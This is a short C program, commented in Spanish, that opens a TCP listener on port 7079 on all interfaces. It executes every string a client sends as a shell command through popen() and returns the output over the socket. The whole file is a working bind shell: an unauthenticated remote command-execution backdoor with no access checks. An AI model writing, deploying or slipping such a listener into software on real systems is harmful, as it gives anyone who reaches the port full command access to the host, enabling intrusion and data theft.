#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PUERTO 7079

// Función para manejar errores y finalizar el programa
void manejar_error(const char* mensaje) {
    perror(mensaje);
    exit(EXIT_FAILURE);
}

// Función para crear un socket
int crear_socket() {
    int socket_servidor = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_servidor == -1) {
        manejar_error("Error al crear el socket");
    }
    return socket_servidor;
}

// Función para configurar la dirección del servidor
struct sockaddr_in configurar_direccion_servidor() {
    struct sockaddr_in direccion_servidor;
    direccion_servidor.sin_family = AF_INET;
    direccion_servidor.sin_addr.s_addr = INADDR_ANY;
    direccion_servidor.sin_port = htons(PUERTO);
    return direccion_servidor;
}

// Función para enlazar el socket con la dirección del servidor
void enlazar_socket(int socket_servidor, struct sockaddr_in* direccion_servidor) {
    if (bind(socket_servidor, (struct sockaddr*)direccion_servidor, sizeof(*direccion_servidor)) == -1) {
        manejar_error("Error al enlazar el socket");
    }
}

// Función para escuchar conexiones entrantes
void escuchar_conexiones(int socket_servidor) {
    if (listen(socket_servidor, 5) == -1) {
        manejar_error("Error al escuchar conexiones");
    }
    printf("El servidor está escuchando en el puerto %d...\n", PUERTO);
}

// Función para aceptar una conexión entrante
int aceptar_conexion(int socket_servidor, struct sockaddr_in* direccion_cliente) {
    socklen_t longitud_cliente = sizeof(*direccion_cliente);
    int socket_cliente = accept(socket_servidor, (struct sockaddr*)direccion_cliente, &longitud_cliente);
    if (socket_cliente == -1) {
        manejar_error("Error al aceptar la conexión");
    }
    printf("Conexión establecida desde %s:%d\n", inet_ntoa(direccion_cliente->sin_addr), ntohs(direccion_cliente->sin_port));
    return socket_cliente;
}

// Función para recibir comandos del cliente, ejecutarlos y enviar respuestas
void recibir_y_ejecutar_comandos(int socket_cliente) {
    char buffer[1024];
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        ssize_t bytes_recibidos = recv(socket_cliente, buffer, sizeof(buffer), 0);
        if (bytes_recibidos <= 0) {
            break;
        }
        FILE* salida_comando = popen(buffer, "r");
        if (salida_comando == NULL) {
            manejar_error("Error al ejecutar el comando");
        }
        while (fgets(buffer, sizeof(buffer), salida_comando) != NULL) {
            send(socket_cliente, buffer, strlen(buffer), 0);
        }
        pclose(salida_comando);
    }
}

// Función para cerrar conexiones
void cerrar_conexiones(int socket_cliente, int socket_servidor) {
    close(socket_cliente);
    close(socket_servidor);
}

// Función principal
int main() {
  // Crear un socket
    int socket_servidor = crear_socket();
  // Configurar la dirección del servidor
    struct sockaddr_in direccion_servidor = configurar_direccion_servidor();
  // Enlazar el socket con la dirección del servidor
    enlazar_socket(socket_servidor, &direccion_servidor);
  // Escuchar conexiones entrantes
    escuchar_conexiones(socket_servidor);
  // Aceptar una conexión
    int socket_cliente = aceptar_conexion(socket_servidor, &direccion_servidor);
  // Recibir comandos, ejecutarlos y enviar respuestas
    recibir_y_ejecutar_comandos(socket_cliente);
    cerrar_conexiones(socket_cliente, socket_servidor);
    return 0;
}